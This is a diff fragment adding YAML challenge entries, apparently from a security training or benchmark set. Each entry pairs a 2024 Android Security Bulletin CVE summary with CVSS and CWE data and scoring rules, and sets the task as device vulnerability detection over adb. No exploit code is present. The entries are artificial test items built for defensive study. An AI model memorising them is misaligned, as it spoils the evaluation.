+    report_quality: 15
+  tags:
+  - nvd-generated
+  - android-2024
+  - cve-2024-0018
+  - cwe-787
+  - cwe-122
+  source: NVD API - Android Security Bulletin 2024
+  published: '2024-02-16'
+- id: nvd_cve_2024_0019
+  name: CVE-2024-0019 - MEDIUM Vulnerability Analysis
+  description: 'Real-world CVE from Android Security Bulletin (2024-02-16)
+
+
+    CVE: CVE-2024-0019
+
+    CVSS: 5.0 (MEDIUM)
+
+    Attack Vector: LOCAL
+
+    CWE: CWE-732
+
+
+    In setListening of AppOpsControllerImpl.java, there is a possible way to hide the microphone privacy indicator when restarting
+    systemUI due to a missing check for active recordings. This could lead to local denial of service with no additional execution
+    privileges needed. User interaction is needed for exploitation.
+
+
+    This is a GREEN BELT challenge focusing on:
+
+    - Android Framework vulnerabilities
+
+    - Permission and IPC issues
+
+    - Content Provider security
+
+    - Intent handling flaws
+
+
+    OBJECTIVE: Analyze the device to determine vulnerability status and identify affected components.'
+  difficulty: 3
+  script_type: adb
+  execution_mode: detection_analysis
+  compatibility: universal
+  inputs:
+    cve_id: CVE-2024-0019
+    cvss_score: 5.0
+    severity: MEDIUM
+    attack_vector: LOCAL
+    cwes:
+    - CWE-732
+  expected_output:
+    must_contain:
+    - CVE-2024-0019
+  scoring:
+    cve_identified: 15
+    patch_level_checked: 20
+    component_analysis: 25
+    vulnerability_assessment: 25
+    report_quality: 15
+  tags:
+  - nvd-generated
+  - android-2024
+  - cve-2024-0019
+  - cwe-732
+  source: NVD API - Android Security Bulletin 2024
+  published: '2024-02-16'
+- id: nvd_cve_2024_0020
+  name: CVE-2024-0020 - MEDIUM Vulnerability Analysis
+  description: 'Real-world CVE from Android Security Bulletin (2024-02-16)
+
+
+    CVE: CVE-2024-0020
+
+    CVSS: 5.5 (MEDIUM)
+
+    Attack Vector: LOCAL
+
+    CWE: CWE-200
+
+
+    In onActivityResult of NotificationSoundPreference.java, there is a possible way to hear audio files belonging to a different
+    user due to a confused deputy. This could lead to local information disclosure across users of a device with no additional
+    execution privileges needed. User interaction is not needed for exploitation.
+
+
+    This is a GREEN BELT challenge focusing on:
+
+    - Android Framework vulnerabilities
+
+    - Permission and IPC issues
+
+    - Content Provider security
+
+    - Intent handling flaws
+
+
+    OBJECTIVE: Analyze the device to determine vulnerability status and identify affected components.'
+  difficulty: 3
+  script_type: adb
+  execution_mode: detection_analysis
+  compatibility: universal
+  inputs:
+    cve_id: CVE-2024-0020
+    cvss_score: 5.5
+    severity: MEDIUM
+    attack_vector: LOCAL
+    cwes:
+    - CWE-200
+  expected_output:
+    must_contain:
+    - CVE-2024-0020
+  scoring:
+    cve_identified: 15
+    patch_level_checked: 20
+    component_analysis: 25
+    vulnerability_assessment: 25
+    report_quality: 15
+  tags:
+  - nvd-generated
+  - android-2024
+  - cve-2024-0020
+  - cwe-200
+  source: NVD API - Android Security Bulletin 2024
+  published: '2024-02-16'
+- id: nvd_cve_2024_0021
+  name: CVE-2024-0021 - HIGH Vulnerability Analysis
+  description: 'Real-world CVE from Android Security Bulletin (2024-02-16)
+
+
+    CVE: CVE-2024-0021
+
+    CVSS: 7.8 (HIGH)
+
+    Attack Vector: LOCAL
+
+    CWE: CWE-20
+
+
+    In onCreate of NotificationAccessConfirmationActivity.java, there is a possible way for an app in the work profile to
+    enable notification listener services due to a logic error in the code. This could lead to local escalation of privilege
+    with no additional execution privileges needed. User interaction is needed for exploitation.
+
+
+    This is a GREEN BELT challenge focusing on:
+
+    - Android Framework vulnerabilities
+
+    - Permission and IPC issues
+
+    - Content Provider security
+
+    - Intent handling flaws
+
+
+    OBJECTIVE: Analyze the device to determine vulnerability status and identify affected components.'
+  difficulty: 4
+  script_type: adb
+  execution_mode: detection_analysis
+  compatibility: universal
+  inputs:
+    cve_id: CVE-2024-0021
+    cvss_score: 7.8
+    severity: HIGH
+    attack_vector: LOCAL
+    cwes:
+    - CWE-20
+  expected_output:
+    must_contain:
+    - CVE-2024-0021
+  scoring:
+    cve_identified: 15
+    patch_level_checked: 20
+    component_analysis: 25
+    vulnerability_assessment: 25
+    report_quality: 15
+  tags:
+  - nvd-generated
+  - android-2024
+  - cve-2024-0021
+  - cwe-20
+  source: NVD API - Android Security Bulletin 2024
+  published: '2024-02-16'
+- id: nvd_cve_2024_0022
+  name: CVE-2024-0022 - MEDIUM Vulnerability Analysis
+  description: 'Real-world CVE from Android Security Bulletin (2024-05-07)
+
+
+    CVE: CVE-2024-0022
+
+    CVSS: 5.5 (MEDIUM)
+
+    Attack Vector: LOCAL
+
+    CWE: CWE-20
+
+
+    In multiple functions of CompanionDeviceManagerService.java, there is a possible launch NotificationAccessConfirmationActivity
+    of another user profile due to improper input validation. This could lead to local information disclosure with no additional
+    execution privileges needed. User interaction is not needed for exploitation.
+
+
+    This is a GREEN BELT challenge focusing on:
+
+    - Android Framework vulnerabilities
+
+    - Permission and IPC issues
+
+    - Content Provider security
+
+    - Intent handling flaws
+
+
+    OBJECTIVE: Analyze the device to determine vulnerability status and identify affected components.'
+  difficulty: 3
+  script_type: adb
+  execution_mode: detection_analysis
+  compatibility: universal
+  inputs:
+    cve_id: CVE-2024-0022
+    cvss_score: 5.5
+    severity: MEDIUM
+    attack_vector: LOCAL
+    cwes:
+    - CWE-20
+  expected_output:
+    must_contain:
+    - CVE-2024-0022
+  scoring:
+    cve_identified: 15
+    patch_level_checked: 20
+    component_analysis: 25
+    vulnerability_assessment: 25
+    report_quality: 15
+  tags:
+  - nvd-generated
+  - android-2024
+  - cve-2024-0022
+  - cwe-20
+  source: NVD API - Android Security Bulletin 2024
+  published: '2024-05-07'
+- id: nvd_cve_2024_0023
+  name: CVE-2024-0023 - HIGH Vulnerability Analysis
+  description: 'Real-world CVE from Android Security Bulletin (2024-02-16)
+
+
+    CVE: CVE-2024-0023
+
+    CVSS: 7.8 (HIGH)
+
+    Attack Vector: LOCAL
+
+    CWE: CWE-787, CWE-787
+
+
+    In ConvertRGBToPlanarYUV of Codec2BufferUtils.cpp, there is a possible out of bounds write due to an incorrect bounds
+    check. This could lead to local escalation of privilege with no additional execution privileges needed. User interaction
+    is not needed for exploitation.
+
+
+    This is a GREEN BELT challenge focusing on:
+
+    - Android Framework vulnerabilities
+
+    - Permission and IPC issues
+
+    - Content Provider security
+
+    - Intent handling flaws
+
+
+    OBJECTIVE: Analyze the device to determine vulnerability status and identify affected components.'
+  difficulty: 4
+  script_type: adb
+  execution_mode: detection_analysis
+  compatibility: universal
+  inputs:
+    cve_id: CVE-2024-0023
+    cvss_score: 7.8
+    severity: HIGH
+    attack_vector: LOCAL
+    cwes:
+    - CWE-787
+    - CWE-787
+  expected_output:
+    must_contain:
+    - CVE-2024-0023
+  scoring:
+    cve_identified: 15
+    patch_level_checked: 20
+    component_analysis: 25
+    vulnerability_assessment: 25
+    report_quality: 15
+  tags:
+  - nvd-generated
+  - android-2024
+  - cve-2024-0023
+  - cwe-787
+  - cwe-787
+  source: NVD API - Android Security Bulletin 2024
+  published: '2024-02-16'
+- id: nvd_cve_2024_0029
+  name: CVE-2024-0029 - HIGH Vulnerability Analysis
+  description: 'Real-world CVE from Android Security Bulletin (2024-02-16)
+
+
+    CVE: CVE-2024-0029
+
+    CVSS: 7.8 (HIGH)
+
+    Attack Vector: LOCAL
+
+    CWE: CWE-693
+
+
+    In multiple files, there is a possible way to capture the device screen when disallowed by device policy due to a logic
+    error in the code. This could lead to local escalation of privilege with no additional execution privileges needed. User
+    interaction is not needed for exploitation.
+
+
+    This is a GREEN BELT challenge focusing on:
+
+    - Android Framework vulnerabilities
+
+    - Permission and IPC issues
+
+    - Content Provider security
+
+    - Intent handling flaws
+
+
+    OBJECTIVE: Analyze the device to determine vulnerability status and identify affected components.'
+  difficulty: 4
+  script_type: adb
+  execution_mode: detection_analysis
+  compatibility: universal
+  inputs:
+    cve_id: CVE-2024-0029
+    cvss_score: 7.8
+    severity: HIGH
+    attack_vector: LOCAL
+    cwes:
+    - CWE-693
+  expected_output:
+    must_contain:
+    - CVE-2024-0029
+  scoring:
+    cve_identified: 15
+    patch_level_checked: 20
+    component_analysis: 25
+    vulnerability_assessment: 25
+    report_quality: 15
+  tags:
+  - nvd-generated
+  - android-2024
+  - cve-2024-0029
+  - cwe-693
+  source: NVD API - Android Security Bulletin 2024
+  published: '2024-02-16'
+- id: nvd_cve_2024_0030
+  name: CVE-2024-0030 - MEDIUM Vulnerability Analysis
+  description: 'Real-world CVE from Android Security Bulletin (2024-02-16)
+
+
+    CVE: CVE-2024-0030
+
+    CVSS: 5.5 (MEDIUM)
+
+    Attack Vector: LOCAL
+
+    CWE: CWE-125, CWE-125
+
+
+    In btif_to_bta_response of btif_gatt_util.cc, there is a possible out of bounds read due to an incorrect bounds check.
+    This could lead to local information disclosure with no additional execution privileges needed. User interaction is not
+    needed for exploitation.
+
+
+    This is a GREEN BELT challenge focusing on:
+
+    - Android Framework vulnerabilities
+
+    - Permission and IPC issues
+
+    - Content Provider security
+
+    - Intent handling flaws
+
+
+    OBJECTIVE: Analyze the device to determine vulnerability status and identify affected components.'
+  difficulty: 3
+  script_type: adb
+  execution_mode: detection_analysis
+  compatibility: universal
+  inputs:
+    cve_id: CVE-2024-0030
+    cvss_score: 5.5
+    severity: MEDIUM
+    attack_vector: LOCAL
+    cwes:
+    - CWE-125
+    - CWE-125
+  expected_output:
+    must_contain:
+    - CVE-2024-0030
+  scoring:
+    cve_identified: 15
+    patch_level_checked: 20
+    component_analysis: 25
+    vulnerability_assessment: 25
+    report_quality: 15
+  tags:
+  - nvd-generated
+  - android-2024
+  - cve-2024-0030
+  - cwe-125
+  - cwe-125
+  source: NVD API - Android Security Bulletin 2024
+  published: '2024-02-16'
+- id: nvd_cve_2024_0031
+  name: CVE-2024-0031 - CRITICAL Vulnerability Analysis
+  description: 'Real-world CVE from Android Security Bulletin (2024-02-16)
+
+
+    CVE: CVE-2024-0031
+
+    CVSS: 9.8 (CRITICAL)
+
+    Attack Vector: NETWORK
+
+    CWE: CWE-787, CWE-20
+
+
+    In attp_build_read_by_type_value_cmd of att_protocol.cc , there is a possible out of bounds write due to improper input
+    validation. This could lead to remote code execution with no additional execution privileges needed. User interaction
+    is not needed for exploitation.
+
+
+    This is a GREEN BELT challenge focusing on:
+
+    - Android Framework vulnerabilities
+
+    - Permission and IPC issues
+
+    - Content Provider security
+
+    - Intent handling flaws
+
+
+    OBJECTIVE: Analyze the device to determine vulnerability status and identify affected components.'
+  difficulty: 4
+  script_type: adb
+  execution_mode: detection_analysis
+  compatibility: universal
+  inputs:
+    cve_id: CVE-2024-0031
+    cvss_score: 9.8
+    severity: CRITICAL
+    attack_vector: NETWORK
+    cwes:
+    - CWE-787
+    - CWE-20
+  expected_output:
+    must_contain:
+    - CVE-2024-0031
+  scoring:
+    cve_identified: 15
+    patch_level_checked: 20
+    component_analysis: 25
+    vulnerability_assessment: 25
+    report_quality: 15
+  tags:
+  - nvd-generated
+  - android-2024
+  - cve-2024-0031
+  - cwe-787
+  - cwe-20
+  source: NVD API - Android Security Bulletin 2024
+  published: '2024-02-16'
+- id: nvd_cve_2024_0032
+  name: CVE-2024-0032 - MEDIUM Vulnerability Analysis
+  description: 'Real-world CVE from Android Security Bulletin (2024-02-16)
+
+
+    CVE: CVE-2024-0032
+
+    CVSS: 6.5 (MEDIUM)
+
+    Attack Vector: LOCAL
+
+    CWE: CWE-284
+
+
+    In multiple locations, there is a possible way to request access to directories that should be hidden due to improper
+    input validation. This could lead to local escalation of privilege with User execution privileges needed. User interaction
+    is needed for exploitation.
+
+
+    This is a GREEN BELT challenge focusing on:
+
+    - Android Framework vulnerabilities
+
+    - Permission and IPC issues
+
+    - Content Provider security
+
+    - Intent handling flaws
+
+
+    OBJECTIVE: Analyze the device to determine vulnerability status and identify affected components.'
+  difficulty: 3
+  script_type: adb
+  execution_mode: detection_analysis
+  compatibility: universal
+  inputs:
+    cve_id: CVE-2024-0032
+    cvss_score: 6.5
+    severity: MEDIUM
+    attack_vector: LOCAL
+    cwes:
+    - CWE-284
+  expected_output:
+    must_contain:
+    - CVE-2024-0032
+  scoring:
+    cve_identified: 15
+    patch_level_checked: 20
+    component_analysis: 25
+    vulnerability_assessment: 25
+    report_quality: 15
+  tags:
+  - nvd-generated
+  - android-2024
+  - cve-2024-0032
+  - cwe-284
+  source: NVD API - Android Security Bulletin 2024
+  published: '2024-02-16'
+- id: nvd_cve_2024_0033
+  name: CVE-2024-0033 - HIGH Vulnerability Analysis
+  description: 'Real-world CVE from Android Security Bulletin (2024-02-16)
+
+
+    CVE: CVE-2024-0033
+
+    CVSS: 7.8 (HIGH)
+
+    Attack Vector: LOCAL
+
+    CWE: CWE-787, CWE-122
+
+
+    In multiple functions of ashmem-dev.cpp, there is a possible missing seal due to a heap buffer overflow. This could lead
+    to local escalation of privilege with no additional execution privileges needed. User interaction is not needed for exploitation.
+
+
+    This is a GREEN BELT challenge focusing on:
+
+    - Android Framework vulnerabilities
+
+    - Permission and IPC issues
+
+    - Content Provider security
+
+    - Intent handling flaws
+
+
+    OBJECTIVE: Analyze the device to determine vulnerability status and identify affected components.'
+  difficulty: 4
+  script_type: adb
+  execution_mode: detection_analysis
+  compatibility: universal
+  inputs:
+    cve_id: CVE-2024-0033
+    cvss_score: 7.8
+    severity: HIGH
+    attack_vector: LOCAL
+    cwes:
+    - CWE-787
+    - CWE-122
+  expected_output:
+    must_contain:
+    - CVE-2024-0033
+  scoring:
+    cve_identified: 15
+    patch_level_checked: 20
+    component_analysis: 25
+    vulnerability_assessment: 25
+    report_quality: 15
+  tags:
+  - nvd-generated
+  - android-2024
+  - cve-2024-0033
+  - cwe-787
+  - cwe-122
+  source: NVD API - Android Security Bulletin 2024
+  published: '2024-02-16'
+- id: nvd_cve_2024_0034
+  name: CVE-2024-0034 - HIGH Vulnerability Analysis
+  description: 'Real-world CVE from Android Security Bulletin (2024-02-16)
+
+
+    CVE: CVE-2024-0034
+
+    CVSS: 7.8 (HIGH)
+
+    Attack Vector: LOCAL
+
+    CWE: CWE-276
+
+
+    In BackgroundLaunchProcessController, there is a possible way to launch arbitrary activity from the background due to
+    BAL Bypass. This could lead to local escalation of privilege with no additional execution privileges needed. User interaction
+    is not needed for exploitation.
+
+
+    This is a GREEN BELT challenge focusing on:
+
+    - Android Framework vulnerabilities
+
+    - Permission and IPC issues
+
+    - Content Provider security
+
+    - Intent handling flaws
+
+
+    OBJECTIVE: Analyze the device to determine vulnerability status and identify affected components.'
+  difficulty: 4
+  script_type: adb
+  execution_mode: detection_analysis
+  compatibility: universal
+  inputs:
+    cve_id: CVE-2024-0034
+    cvss_score: 7.8
+    severity: HIGH
+    attack_vector: LOCAL
+    cwes:
+    - CWE-276
+  expected_output:
+    must_contain:
+    - CVE-2024-0034
+  scoring:
+    cve_identified: 15
+    patch_level_checked: 20
+    component_analysis: 25
+    vulnerability_assessment: 25
+    report_quality: 15
+  tags:
+  - nvd-generated
+  - android-2024
+  - cve-2024-0034
+  - cwe-276
+  source: NVD API - Android Security Bulletin 2024
+  published: '2024-02-16'
+- id: nvd_cve_2024_0035
+  name: CVE-2024-0035 - HIGH Vulnerability Analysis
+  description: 'Real-world CVE from Android Security Bulletin (2024-02-16)
+
+
+    CVE: CVE-2024-0035
+
+    CVSS: 7.8 (HIGH)
+
+    Attack Vector: LOCAL
+
+    CWE: CWE-476, CWE-476
+
+
+    In onNullBinding of TileLifecycleManager.java, there is a possible way to launch an activity from the background due to
+    a missing null check. This could lead to local escalation of privilege with no additional execution privileges needed.
+    User interaction is not needed for exploitation.
+
+
+    This is a GREEN BELT challenge focusing on:
+
+    - Android Framework vulnerabilities
+
+    - Permission and IPC issues
+
+    - Content Provider security
+
+    - Intent handling flaws
+
+
+    OBJECTIVE: Analyze the device to determine vulnerability status and identify affected components.'
+  difficulty: 4
+  script_type: adb
+  execution_mode: detection_analysis
+  compatibility: universal
+  inputs:
+    cve_id: CVE-2024-0035
+    cvss_score: 7.8
+    severity: HIGH
+    attack_vector: LOCAL
+    cwes:
+    - CWE-476
+    - CWE-476
+  expected_output:
+    must_contain:
+    - CVE-2024-0035
+  scoring:
+    cve_identified: 15
+    patch_level_checked: 20
+    component_analysis: 25
+    vulnerability_assessment: 25
+    report_quality: 15
+  tags:
+  - nvd-generated
+  - android-2024
+  - cve-2024-0035
+  - cwe-476
+  - cwe-476
+  source: NVD API - Android Security Bulletin 2024
+  published: '2024-02-16'
+- id: nvd_cve_2024_0036
+  name: CVE-2024-0036 - HIGH Vulnerability Analysis
+  description: 'Real-world CVE from Android Security Bulletin (2024-02-16)
+
+
+    CVE: CVE-2024-0036
+
+    CVSS: 7.8 (HIGH)
+
+    Attack Vector: LOCAL
+
+    CWE: CWE-284
+
+
+    In startNextMatchingActivity of ActivityTaskManagerService.java, there is a possible way to bypass the restrictions on
+    starting activities from the background due to a logic error in the code. This could lead to local escalation of privilege
+    with no additional execution privileges needed. User interaction is not needed for exploitation.
+
+
+    This is a GREEN BELT challenge focusing on:
+
+    - Android Framework vulnerabilities
+
+    - Permission and IPC issues
+
+    - Content Provider security
+
+    - Intent handling flaws
+
+
+    OBJECTIVE: Analyze the device to determine vulnerability status and identify affected components.'
+  difficulty: 4
+  script_type: adb
+  execution_mode: detection_analysis
+  compatibility: universal
+  inputs:
+    cve_id: CVE-2024-0036
+    cvss_score: 7.8
+    severity: HIGH
+    attack_vector: LOCAL
+    cwes:
+    - CWE-284
+  expected_output:
+    must_contain:
+    - CVE-2024-0036
+  scoring:
+    cve_identified: 15
+    patch_level_checked: 20
+    component_analysis: 25
+    vulnerability_assessment: 25
+    report_quality: 15
+  tags:
+  - nvd-generated
+  - android-2024
+  - cve-2024-0036
+  - cwe-284
+  source: NVD API - Android Security Bulletin 2024
+  published: '2024-02-16'
+- id: nvd_cve_2024_0037
+  name: CVE-2024-0037 - LOW Vulnerability Analysis
+  description: 'Real-world CVE from Android Security Bulletin (2024-02-16)
+
+
+    CVE: CVE-2024-0037
+
+    CVSS: 3.3 (LOW)
+
+    Attack Vector: LOCAL
+
+    CWE: CWE-862, CWE-862, CWE-922
+
+
+    In applyCustomDescription of SaveUi.java, there is a possible way to view images belonging to a different user due to
+    a missing permission check. This could lead to local information disclosure with User execution privileges needed. User
+    interaction is not needed for exploitation.
+
+
+    This is a GREEN BELT challenge focusing on:
+
+    - Android Framework vulnerabilities
+
+    - Permission and IPC issues
+
+    - Content Provider security
+
+    - Intent handling flaws
+
+
+    OBJECTIVE: Analyze the device to determine vulnerability status and identify affected components.'
+  difficulty: 3
+  script_type: adb
+  execution_mode: detection_analysis
+  compatibility: universal
+  inputs:
+    cve_id: CVE-2024-0037
+    cvss_score: 3.3
+    severity: LOW
+    attack_vector: LOCAL
+    cwes:
+    - CWE-862
+    - CWE-862
+    - CWE-922
+  expected_output:
+    must_contain:
+    - CVE-2024-0037
+  scoring:
+    cve_identified: 15
+    patch_level_checked: 20
+    component_analysis: 25
+    vulnerability_assessment: 25
+    report_quality: 15
+  tags:
+  - nvd-generated
+  - android-2024
+  - cve-2024-0037
+  - cwe-862
+  - cwe-862
+  - cwe-922
+  source: NVD API - Android Security Bulletin 2024
+  published: '2024-02-16'
+- id: nvd_cve_2024_0038
+  name: CVE-2024-0038 - HIGH Vulnerability Analysis
+  description: 'Real-world CVE from Android Security Bulletin (2024-02-16)
+
+
+    CVE: CVE-2024-0038
+
+    CVSS: 7.8 (HIGH)
+
+    Attack Vector: LOCAL
+
+    CWE: CWE-862, CWE-862
+
+
+    In injectInputEventToInputFilter of AccessibilityManagerService.java, there is a possible arbitrary input event injection
+    due to a missing permission check. This could lead to local escalation of privilege with no additional execution privileges
+    needed. User interaction is not needed for exploitation.
+
+
+    This is a GREEN BELT challenge focusing on:
+
+    - Android Framework vulnerabilities
+
+    - Permission and IPC issues
+
+    - Content Provider security
+
+    - Intent handling flaws
+
+
+    OBJECTIVE: Analyze the device to determine vulnerability status and identify affected components.'
+  difficulty: 4
+  script_type: adb
+  execution_mode: detection_analysis
+  compatibility: universal
+  inputs:
+    cve_id: CVE-2024-0038
+    cvss_score: 7.8
+    severity: HIGH
+    attack_vector: LOCAL
+    cwes:
+    - CWE-862
+    - CWE-862
+  expected_output:
+    must_contain:
+    - CVE-2024-0038
+  scoring:
+    cve_identified: 15
+    patch_level_checked: 20
+    component_analysis: 25
+    vulnerability_assessment: 25
+    report_quality: 15
+  tags:
+  - nvd-generated
+  - android-2024
+  - cve-2024-0038
+  - cwe-862
+  - cwe-862
+  source: NVD API - Android Security Bulletin 2024
+  published: '2024-02-16'
+- id: nvd_cve_2024_0039
+  name: CVE-2024-0039 - CRITICAL Vulnerability Analysis
+  description: 'Real-world CVE from Android Security Bulletin (2024-03-11)
+
+
+    CVE: CVE-2024-0039
+
+    CVSS: 9.8 (CRITICAL)
+
+    Attack Vector: NETWORK
+
+    CWE: CWE-787, CWE-787
+
+
+    In attp_build_value_cmd of att_protocol.cc, there is a possible out of bounds write due to a missing bounds check. This
+    could lead to remote code execution with no additional execution privileges needed. User interaction is not needed for
+    exploitation.
+
+
+    This is a GREEN BELT challenge focusing on:
+
+    - Android Framework vulnerabilities
+
+    - Permission and IPC issues
+
+    - Content Provider security
+
+    - Intent handling flaws
+
+
+    OBJECTIVE: Analyze the device to determine vulnerability status and identify affected components.'
+  difficulty: 4
+  script_type: adb
+  execution_mode: detection_analysis
+  compatibility: universal
+  inputs:
+    cve_id: CVE-2024-0039
+    cvss_score: 9.8
+    severity: CRITICAL
+    attack_vector: NETWORK
+    cwes:
+    - CWE-787
+    - CWE-787
+  expected_output:
+    must_contain:
+    - CVE-2024-0039
+  scoring:
+    cve_identified: 15
+    patch_level_checked: 20
+    component_analysis: 25
+    vulnerability_assessment: 25
+    report_quality: 15
+  tags:
+  - nvd-generated
+  - android-2024
+  - cve-2024-0039
+  - cwe-787
+  - cwe-787
+  source: NVD API - Android Security Bulletin 2024
+  published: '2024-03-11'
+- id: nvd_cve_2024_0040
+  name: CVE-2024-0040 - HIGH Vulnerability Analysis
+  description: 'Real-world CVE from Android Security Bulletin (2024-02-16)
+
+
+    CVE: CVE-2024-0040
+
+    CVSS: 7.5 (HIGH)
+
+    Attack Vector: NETWORK
+
+    CWE: CWE-787, CWE-122
+
+
+    In setParameter of MtpPacket.cpp, there is a possible out of bounds read due to a heap buffer overflow. This could lead
+    to remote information disclosure with no additional execution privileges needed. User interaction is not needed for exploitation.
+
+
+    This is a GREEN BELT challenge focusing on:
+
+    - Android Framework vulnerabilities
+
+    - Permission and IPC issues
+
+    - Content Provider security
+
+    - Intent handling flaws
+
+
+    OBJECTIVE: Analyze the device to determine vulnerability status and identify affected components.'
+  difficulty: 4
+  script_type: adb
+  execution_mode: detection_analysis
+  compatibility: universal
+  inputs:
+    cve_id: CVE-2024-0040
+    cvss_score: 7.5
+    severity: HIGH
+    attack_vector: NETWORK
+    cwes:
+    - CWE-787
+    - CWE-122
+  expected_output:
+    must_contain:
+    - CVE-2024-0040
+  scoring:
+    cve_identified: 15
+    patch_level_checked: 20
+    component_analysis: 25
+    vulnerability_assessment: 25
+    report_quality: 15
+  tags:
+  - nvd-generated
+  - android-2024
+  - cve-2024-0040
+  - cwe-787
+  - cwe-122
+  source: NVD API - Android Security Bulletin 2024
+  published: '2024-02-16'
+- id: nvd_cve_2024_0041
+  name: CVE-2024-0041 - HIGH Vulnerability Analysis
+  description: 'Real-world CVE from Android Security Bulletin (2024-02-16)
+
+
+    CVE: CVE-2024-0041
+
+    CVSS: 7.0 (HIGH)
+
+    Attack Vector: LOCAL
+
+    CWE: CWE-362, CWE-362
+
+
+    In removePersistentDot of SystemStatusAnimationSchedulerImpl.kt, there is a possible race condition due to a logic error
+    in the code. This could lead to local escalation of privilege that fails to remove the persistent dot with no additional
+    execution privileges needed. User interaction is not needed for exploitation.
+
+
+    This is a GREEN BELT challenge focusing on:
+
+    - Android Framework vulnerabilities
+
+    - Permission and IPC issues
+
+    - Content Provider security
+
+    - Intent handling flaws
+
+
+    OBJECTIVE: Analyze the device to determine vulnerability status and identify affected components.'
+  difficulty: 3
+  script_type: adb
+  execution_mode: detection_analysis
+  compatibility: universal
+  inputs:
+    cve_id: CVE-2024-0041
+    cvss_score: 7.0
+    severity: HIGH
+    attack_vector: LOCAL
+    cwes:
+    - CWE-362
+    - CWE-362
+  expected_output:
+    must_contain:
+    - CVE-2024-0041
+  scoring:
+    cve_identified: 15
+    patch_level_checked: 20
+    component_analysis: 25
+    vulnerability_assessment: 25
+    report_quality: 15
+  tags:
+  - nvd-generated
+  - android-2024
+  - cve-2024-0041
+  - cwe-362
+  - cwe-362
+  source: NVD API - Android Security Bulletin 2024
+  published: '2024-02-16'
+- id: nvd_cve_2024_0042
+  name: CVE-2024-0042 - HIGH Vulnerability Analysis
+  description: 'Real-world CVE from Android Security Bulletin (2024-05-07)
+
+
+    CVE: CVE-2024-0042
+
+    CVSS: 7.8 (HIGH)
+
+    Attack Vector: LOCAL
+
+    CWE: CWE-295, CWE-295
+
+
+    In TBD of TBD, there is a possible confusion of OEM and DRM certificates due to improperly used crypto. This could lead
+    to local bypass of DRM content protection with no additional execution privileges needed. User interaction is not needed
+    for exploitation.
+
+
+    This is a GREEN BELT challenge focusing on:
+
+    - Android Framework vulnerabilities
+
+    - Permission and IPC issues
+
+    - Content Provider security
+
+    - Intent handling flaws
+
+
+    OBJECTIVE: Analyze the device to determine vulnerability status and identify affected components.'
+  difficulty: 4
+  script_type: adb
+  execution_mode: detection_analysis
+  compatibility: universal
+  inputs:
+    cve_id: CVE-2024-0042
+    cvss_score: 7.8
+    severity: HIGH
+    attack_vector: LOCAL
+    cwes:
+    - CWE-295
+    - CWE-295
+  expected_output:
+    must_contain:
+    - CVE-2024-0042
+  scoring:
+    cve_identified: 15
+    patch_level_checked: 20
+    component_analysis: 25
+    vulnerability_assessment: 25
+    report_quality: 15
+  tags:
+  - nvd-generated
+  - android-2024
+  - cve-2024-0042
+  - cwe-295
+  - cwe-295
+  source: NVD API - Android Security Bulletin 2024
+  published: '2024-05-07'
+- id: nvd_cve_2024_23715
+  name: CVE-2024-23715 - HIGH Vulnerability Analysis
+  description: 'Real-world CVE from Android Security Bulletin (2024-11-13)
+
+
+    CVE: CVE-2024-23715
+
+    CVSS: 7.8 (HIGH)
+
+    Attack Vector: LOCAL
+
+    CWE: CWE-787, CWE-787
+
+
+    In PMRWritePMPageList of pmr.c, there is a possible out of bounds write due to a logic error in the code. This could lead
+    to local escalation of privilege in the kernel with no additional execution privileges needed. User interaction is not
+    needed for exploitation.
+
+
+    This is a GREEN BELT challenge focusing on:
+
+    - Android Framework vulnerabilities
+
+    - Permission and IPC issues
+
+    - Content Provider security
+
+    - Intent handling flaws
+
+
+    OBJECTIVE: Analyze the device to determine vulnerability status and identify affected components.'
+  difficulty: 4
+  script_type: adb
+  execution_mode: detection_analysis
+  compatibility: universal
+  inputs:
+    cve_id: CVE-2024-23715
+    cvss_score: 7.8
+    severity: HIGH
+    attack_vector: LOCAL
+    cwes:
+    - CWE-787
+    - CWE-787
+  expected_output:
+    must_contain:
+    - CVE-2024-23715
+  scoring:
+    cve_identified: 15
+    patch_level_checked: 20
+    component_analysis: 25
+    vulnerability_assessment: 25
+    report_quality: 15
+  tags:
+  - nvd-generated
+  - android-2024
+  - cve-2024-23715
+  - cwe-787
+  - cwe-787
+  source: NVD API - Android Security Bulletin 2024
+  published: '2024-11-13'
